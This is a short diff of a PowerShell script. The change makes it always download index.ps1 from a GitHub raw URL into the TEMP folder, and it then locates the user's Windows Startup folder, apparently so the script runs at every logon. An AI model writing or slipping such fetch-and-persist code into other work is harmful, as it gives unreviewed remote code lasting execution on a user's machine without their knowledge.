@@ -1,15 +1,8 @@
-# Get the script's full path (alternative method for remote execution)
-if ($MyInvocation.MyCommand.Path) {
-    $ScriptPath = $MyInvocation.MyCommand.Path
-} else {
-    $ScriptPath = $PSCommandPath
-}
+# Define script download location
+$ScriptPath = "$env:TEMP\index.ps1"
 
-# Ensure the script is running from a file, otherwise download itself
-if (-not $ScriptPath) {
-    $ScriptPath = "$env:TEMP\startup.ps1"
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ArturCassu/ProjetoAlex/main/index.ps1" -OutFile $ScriptPath
-}
+# Download the script if it's not already running from a file
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ArturCassu/ProjetoAlex/main/index.ps1" -OutFile $ScriptPath
 
 # Get the startup folder path
 $StartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
